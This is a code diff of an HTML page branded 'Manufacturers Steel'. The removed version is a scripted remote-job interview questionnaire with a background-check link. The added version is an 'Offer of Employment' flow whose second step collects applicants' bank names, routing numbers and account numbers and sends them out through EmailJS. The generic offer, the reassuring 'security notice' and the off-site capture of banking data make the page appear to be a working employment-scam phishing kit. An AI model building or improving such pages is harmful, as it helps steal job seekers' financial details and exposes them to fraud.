@@ -2,298 +2,221 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Manufacturers Steel Interview</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Employee Onboarding | Manufacturers Steel.</title>
+
 <style>
-body{
-  margin:0;
-  background:#f1f2f4;
-  font-family:Arial,Helvetica,sans-serif;
+* { box-sizing: border-box; }
+
+body {
+    font-family: Arial, sans-serif;
+    background:#f4f4f4;
+    margin:0;
+    padding:20px;
 }
-.container{
-  max-width:700px;
-  margin:40px auto;
-  background:white;
-  padding:40px;
-  border-radius:10px;
-  box-shadow:0 10px 30px rgba(0,0,0,0.1);
+
+.form-container {
+    background:#fff;
+    padding:30px;
+    max-width:700px;
+    margin:auto;
+    border-radius:8px;
+    box-shadow:0 2px 10px rgba(0,0,0,0.1);
 }
-.logo{
-  text-align:center;
-  font-size:28px;
-  font-weight:bold;
-  margin-bottom:20px;
+
+h1, h2 { text-align:center; }
+
+input[type="text"] {
+    width:100%;
+    padding:10px;
+    margin-top:10px;
+    border-radius:4px;
+    border:1px solid #ccc;
 }
-.question{
-  font-size:20px;
-  margin-bottom:20px;
-  line-height:1.5;
+
+.center-section {
+    max-width:400px;
+    margin:0 auto;
 }
-input, select{
-  width:100%;
-  padding:14px;
-  font-size:16px;
-  border:1px solid #ddd;
-  border-radius:6px;
-  margin-bottom:10px;
+
+.account-type {
+    display:flex;
+    justify-content:center;
+    gap:40px;
+    margin-top:20px;
+    flex-wrap:wrap;
 }
-.error{
-  font-size:14px;
-  color:#dc2626;
-  margin-bottom:15px;
-  display:none;
+
+.center-text {
+    text-align:center;
+    margin-top:20px;
+    color:#444;
 }
-button{
-  background:#ff6a00;
-  color:white;
-  border:none;
-  padding:14px 30px;
-  font-size:18px;
-  border-radius:30px;
-  cursor:pointer;
+
+.security-notice {
+    background:#f8f9fa;
+    border-left:4px solid #007bff;
+    padding:15px;
+    margin-top:20px;
+    font-size:14px;
+    color:#333;
 }
-button:hover{ opacity:.9; }
-.progress{
-  font-size:14px;
-  color:#666;
-  margin-bottom:20px;
-  text-align:right;
+
+.signature-section {
+    text-align:center;
+    margin-top:30px;
+}
+
+.signature-section input {
+    width:45%;
+    margin:5px 10px;
+}
+
+.submit-btn {
+    display:block;
+    margin:30px auto 0;
+    background:#007bff;
+    color:white;
+    padding:12px 20px;
+    border:none;
+    border-radius:5px;
+    cursor:pointer;
+    font-size:16px;
+}
+
+.submit-btn:hover { background:#0056b3; }
+
+.hidden { display:none; }
+
+.footer {
+    text-align:center;
+    font-size:13px;
+    color:#666;
+    margin-top:30px;
+    line-height:1.5;
+}
+
+/* 📱 MOBILE */
+@media (max-width: 600px) {
+    .signature-section input {
+        width:100%;
+        margin:8px 0;
+    }
+
+    .account-type {
+        flex-direction:column;
+        gap:10px;
+    }
 }
 </style>
+
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+(function(){
+    emailjs.init("dCnMUwyT-sgO82hae");
+})();
+
+function acceptOffer(e){
+    e.preventDefault();
+    document.getElementById("offerSection").classList.add("hidden");
+    document.getElementById("depositSection").classList.remove("hidden");
+    window.scrollTo(0,0);
+}
+
+function sendDeposit(e){
+    e.preventDefault();
+    emailjs.sendForm('service_w8bw8vg', 'template_i7oa7kg', e.target)
+    .then(() => {
+        window.location.href = "success.html";
+    }, () => {
+        alert("Submission failed. Please try again.");
+    });
+}
+</script>
 </head>
 
 <body>
-<div class="container">
-  <div class="logo">MANUFACTURERS STEEL</div>
-  <div class="progress" id="progress"></div>
-  <div class="question" id="questionText"></div>
 
-  <div id="inputWrapper">
-    <input id="answerInput" />
-  </div>
+<!-- OFFER SECTION -->
+<div class="form-container" id="offerSection">
+    <h1>Offer of Employment</h1>
 
-  <div class="error" id="errorText">Please select a position to continue.</div>
-  <button onclick="nextQuestion()">Next</button>
+    <p>
+    We are pleased to offer you the position of <strong>Administrative & Billing Assistant</strong> with
+    <strong>Manufacturers Steel.</strong> This is a remote position contingent upon completion of
+    standard onboarding documentation.
+    </p>
+
+    <p>
+    <strong>Employment Type:</strong> Remote<br>
+    <strong>Supervisor:</strong> Recruitment Manager<br>
+    <strong>Compensation:</strong> As discussed during the interview process<br>
+    <strong>Pay Schedule:</strong> Bi-weekly via direct deposit
+    </p>
+
+    <form onsubmit="acceptOffer(event)">
+        <div class="signature-section">
+            <input type="text" name="offer_signature" placeholder="Signature" required>
+            <input type="text" name="offer_name" placeholder="Full Name" required>
+            <input type="text" name="offer_date" placeholder="Date" required>
+        </div>
+
+        <button class="submit-btn">Accept Offer & Continue</button>
+    </form>
+
+    <div class="footer">
+        Manufacturers Steel — Official Employment Offer
+    </div>
 </div>
 
-<script>
-emailjs.init("3PXsfITe9J9_Y5Jxj");
+<!-- DIRECT DEPOSIT -->
+<div class="form-container hidden" id="depositSection">
+    <h1>Direct Deposit Authorization</h1>
 
-// First page (no role overview)
-const firstQuestion = `Welcome to the Structured Pre-Interview Questionnaire. This process will guide you through a few initial questions to help us understand your experience and qualifications.
+    <p class="center-text">
+        This information is required for payroll setup.
+    </p>
 
-Company Overview:
-Manufacturers Steel Company is a family-owned steel service center based in Springville, California. Established in 1951, we are known for quality steel products, competitive pricing, and dependable customer service.
+    <div class="security-notice">
+        🔒 <strong>Security Notice:</strong><br>
+        Banking information is transmitted securely and used solely for payroll processing.
+        Tax documents (W-4) are <strong>not</strong> collected on this page.
+    </div>
 
-Benefits Include:
-• Paid remote training
-• Flexible scheduling
-• Equipment support (if applicable)
-• Sign-up/Welcome Bonus of $500–$750 upon successful completion of training
+    <form onsubmit="sendDeposit(event)">
+        <div class="center-section">
+            <h2>Personal Information</h2>
+            <input type="text" name="fullName" placeholder="Full Name" required>
+        </div>
 
-Please note: You must be located in the U.S. and legally authorized to work.
+        <div class="center-section">
+            <h2>Bank Information</h2>
+            <input type="text" name="bankName" placeholder="Bank Name" required>
+            <input type="text" name="bankAddress" placeholder="Bank Address" required>
+            <input type="text" name="bankCityState" placeholder="City, State" required>
+            <input type="text" name="bankZip" placeholder="Zip Code" required>
+            <input type="text" name="routingNumber" placeholder="Routing Number" required>
+            <input type="text" name="accountNumber" placeholder="Account Number" required>
+        </div>
 
-Please confirm the position you’re applying for to continue.`;
+        <div class="account-type">
+            <label><input type="radio" name="accountType" value="Checking" required> Checking</label>
+            <label><input type="radio" name="accountType" value="Savings" required> Savings</label>
+        </div>
 
-// ================= ADMIN & BILLING =================
-const adminQuestions = [
-`Administrative & Billing Role Overview:
+        <div class="signature-section">
+            <input type="text" name="signature" placeholder="Signature" required>
+            <input type="text" name="date" placeholder="Date" required>
+        </div>
 
-In this role, you’ll support both administrative operations and billing-related tasks. Your responsibilities will include:
-Providing general administrative and operational support,
-Maintaining accurate records, documents, and billing information,
-Assisting with invoicing, payment tracking, and resolving billing discrepancies,
-Communicating with customers and internal teams via email, chat, and phone,
-Following up on open tasks and ensuring deadlines are met,
-Working independently while staying organized and detail-oriented.
+        <button class="submit-btn">Submit & Continue</button>
+    </form>
 
-Overtime opportunities may be available when required.
+    <div class="footer">
+        Manufacturers Steel | HR: hr@manufacturerssteel.com
+    </div>
+</div>
 
-Can you confirm where you are currently located?`,
-"Regarding compensation, this position pays between $30 and $35 per hour, depending on experience and availability. There is also a $500–$750 sign-on bonus provided after successful onboarding and training completion. Does this pay range work for you?",
-"What type of schedule are you seeking — full-time, part-time, or flexible?",
-"Tell us a little about yourself and your professional background.",
-"What interested you in this role with MANUFACTURERS STEEL?",
-"Do you have experience with administrative tasks such as data entry, recordkeeping, scheduling, or customer support?",
-"Have you worked with billing-related tasks like invoices, payment tracking, or resolving billing questions?",
-"How do you ensure accuracy and attention to detail when managing multiple tasks or financial records?",
-"If a customer contacts you with a billing concern or urgent issue, how would you handle it?",
-"If you receive a task that is unclear or missing information, what would you do?",
-"Are you comfortable communicating professionally with customers and internal teams through email, chat, and phone?",
-"Can you share an example of a time you caught an error or prevented a problem before it escalated?",
-"If you notice repeated billing or admin issues from the same process, how would you address it?",
-"What would you do if you were unsure how to complete a task?",
-"How do you stay organized and productive while working remotely?",
-"What software tools or technical skills help you succeed in admin and billing support?",
-"How do you maintain a professional tone in emails or chat?",
-"This position requires a background check. Are you comfortable proceeding?",
-"Before we wrap up, is there anything else you’d like us to know about your experience, availability, or interest in the role?"
-];
-
-// ================= PERSONAL ASSISTANT =================
-const paQuestions = [
-`Personal Assistant Role Overview:
-
-In this role, you will be responsible for:
-Providing day-to-day administrative and personal assistant support,
-Managing emails, schedules, and task follow-ups,
-Maintaining accurate records and documentation,
-Communicating professionally via email and live chat,
-Assisting with basic billing or record-tracking tasks when needed,
-Staying organized, detail-oriented, and responsive in a remote environment.
-
-Training is fully remote and designed to help you become comfortable with our systems and workflows.
-
-Can you confirm where you are currently located?`,
-"Regarding compensation, this position pays between $30 and $35 per hour, depending on experience and availability. There is also a $500–$750 sign-on bonus provided after successful onboarding and training completion. Does this pay range work for you?",
-"What type of schedule are you seeking — full-time, part-time, or flexible?",
-"Are you able to maintain consistent availability during agreed working hours?",
-"Tell us a little about yourself and your professional background.",
-"Do you have experience working as a personal assistant, administrative assistant, or in a similar support role?",
-"What types of administrative tasks are you most comfortable handling?",
-"Have you worked remotely before? If yes, what tools or platforms did you use?",
-"How do you stay organized when managing multiple tasks or priorities at the same time?",
-"If you receive a task or instruction that is unclear, what steps do you take before proceeding?",
-"How do you ensure your written communication remains professional and clear, especially in email or live chat?",
-"Can you share an example of a time you noticed a mistake or issue and addressed it before it became a bigger problem?",
-"If you’re unsure how to complete a task, what would you do?",
-"This role involves handling sensitive information. How do you ensure confidentiality and professionalism in your work?",
-"What software or tools are you comfortable using?",
-"This position requires a background check. Are you comfortable proceeding?",
-"Is there anything else you’d like us to know about your experience or availability?"
-];
-
-// ================= COMMUNITY SUPPORT COORDINATOR =================
-const communitySupportQuestions = [
-`Community Support Coordinator Role Overview:
-
-In this role, your responsibilities will include:
-Coordinating program-related initiatives for partner organizations,
-Communicating with vendors and community partners regarding orders, delivery schedules, and logistics,
-Maintaining accurate records of program items, receipts, and approved budgets,
-Assisting internal teams with program reporting and tracking,
-Ensuring all purchases and activities remain within approved scope and documented according to policy,
-Supporting general administrative and operational tasks as needed.
-
-Can you confirm where you are currently located?`,
-"The starting pay for this role is $30 per hour, with the potential to increase based on performance. Does this compensation work for you?",
-"What type of schedule are you seeking — full-time, part-time, or flexible?",
-"Can you tell me a little about yourself and your professional background?",
-"What interested you in the Community Support Coordinator role with Manufacturers Steel?",
-"Do you have experience coordinating programs, managing multiple tasks, or working with vendors and partners?",
-"Have you managed logistics, tracking, or documentation for projects?",
-"How do you ensure accuracy and attention to detail when handling multiple tasks and records simultaneously?",
-"If a vendor or community partner contacts you with an urgent request, how would you handle it?",
-"If a task or request is unclear, what steps would you take to clarify and complete it properly?",
-"Are you comfortable communicating professionally with both internal teams and external partners via email, chat, or phone?",
-"Can you share an example of a time you identified a potential problem before it escalated and how you resolved it?",
-"If you notice repeated issues in a process or workflow, how would you address them?",
-"What would you do if you were unsure how to execute a specific task or follow a process?",
-"How do you stay organized, productive, and focused while working remotely?",
-"What software or technical skills do you have that will help you succeed in program coordination and administrative support?",
-"How do you maintain professionalism and clarity in written communication with multiple stakeholders?",
-"This position requires a background check. Are you comfortable proceeding with that?",
-"Before we wrap up, is there anything else you’d like us to know about your experience, availability, or interest in the role?"
-];
-
-// ================= OTHER ROLES REMAIN UNCHANGED =================
-// ... (rest of your roles remain exactly as in your original script)
-
-// ================= MAIN LOGIC =================
-let current = 0;
-let answers = [];
-let selectedQuestions = [];
-
-const qText = document.getElementById("questionText");
-const progress = document.getElementById("progress");
-const wrapper = document.getElementById("inputWrapper");
-const errorText = document.getElementById("errorText");
-
-function showQuestion(){
-  errorText.style.display = "none";
-
-  if(current === 0){
-    qText.innerText = firstQuestion;
-    progress.innerText = "Question 1 of ?";
-    wrapper.innerHTML = `
-      <select id="answerInput">
-        <option value="">-- Please select a position --</option>
-        <option value="Remote Administrative & Billing Assistant">Remote Administrative & Billing Assistant</option>
-        <option value="Remote Personal Assistant">Remote Personal Assistant</option>
-        <option value="Community Support Coordinator">Community Support Coordinator</option>
-        <option value="Remote Data Entry Clerk">Remote Data Entry Clerk</option>
-        <option value="Remote Customer Service Representative">Remote Customer Service Representative</option>
-        <option value="Remote Order Processor">Remote Order Processor</option>
-        <option value="Remote Administrative/Customer Operations Coordinator">Remote Administrative/Customer Operations Coordinator</option>
-        <option value="Delivery Driver">Delivery Driver</option>
-      </select>
-    `;
-  } else {
-    qText.innerText = selectedQuestions[current-1];
-    progress.innerText = "Question " + (current+1) + " of " + (selectedQuestions.length+1);
-    wrapper.innerHTML = `<input id="answerInput" />`;
-  }
-
-  document.getElementById("answerInput").focus();
-}
-
-function nextQuestion(){
-  const answer = document.getElementById("answerInput").value;
-  if(!answer){
-    errorText.style.display = "block";
-    return;
-  }
-
-  answers.push(answer);
-
-  if(current === 0){
-    if(answer === "Remote Personal Assistant") selectedQuestions = paQuestions;
-    else if(answer === "Remote Data Entry Clerk") selectedQuestions = dataEntryQuestions;
-    else if(answer === "Remote Customer Service Representative") selectedQuestions = csrQuestions;
-    else if(answer === "Remote Order Processor") selectedQuestions = orderProcessorQuestions;
-    else if(answer === "Remote Administrative/Customer Operations Coordinator") selectedQuestions = adminOpsQuestions;
-    else if(answer === "Delivery Driver") selectedQuestions = driverQuestions;
-    else if(answer === "Community Support Coordinator") selectedQuestions = communitySupportQuestions;
-    else selectedQuestions = adminQuestions;
-  }
-
-  current++;
-
-  if(current < selectedQuestions.length + 1){
-    showQuestion();
-  } else {
-    submitInterview();
-  }
-}
-
-function submitInterview(){
-  document.querySelector(".container").innerHTML = "<h2>Submitting your interview...</h2>";
-
-  let message = "Position Applied For: " + answers[0] + "\n\n";
-  for(let i=1;i<answers.length;i++){
-    message += selectedQuestions[i-1] + "\nAnswer: " + answers[i] + "\n\n";
-  }
-
-  emailjs.send(
-    "service_cwzrlga",
-    "template_lgzkb7s",
-    { interview_answers: message }
-  )
-  .then(()=>{
-    document.querySelector(".container").innerHTML = `
-      <h2>✅ Interview Submitted</h2>
-      <p>Thank you for taking the time to complete this interview. We appreciate your interest in <strong>MANUFACTURERS STEEL</strong>.</p>
-      <p>Please complete the background check using the link below:</p>
-      <p>👉 <a href="https://verification.manufacturerssteel.com" target="_blank">
-      https://verification.manufacturerssteel.com</a></p>
-      <p>If you are selected to move forward, a member of our recruitment team may contact you by phone at our official Manufacturers Steel, Inc. number: <strong>(840) 242-7954</strong>.</p>
-      <p><strong>We look forward to potentially welcoming you to our team.</strong></p>
-    `;
-  });
-}
-  
-showQuestion();
-</script>
 </body>
 </html>
